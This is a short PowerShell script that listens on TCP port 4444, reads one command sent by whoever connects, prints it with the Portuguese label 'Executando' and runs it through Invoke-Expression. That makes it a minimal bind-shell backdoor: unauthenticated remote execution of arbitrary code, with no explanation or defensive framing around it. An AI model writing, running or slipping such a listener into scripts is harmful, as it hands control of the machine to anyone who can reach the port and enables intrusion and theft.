$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
Write-Host "Listening on port 4444…"
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
$buffer = New-Object byte[] 1024
$i = $stream.Read($buffer, 0, $buffer.Length)
$cmd = [Text.Encoding]::ASCII.GetString($buffer, 0, $i).Trim()
Write-Host "Executando:" $cmd
Invoke-Expression $cmd
$listener.Stop()
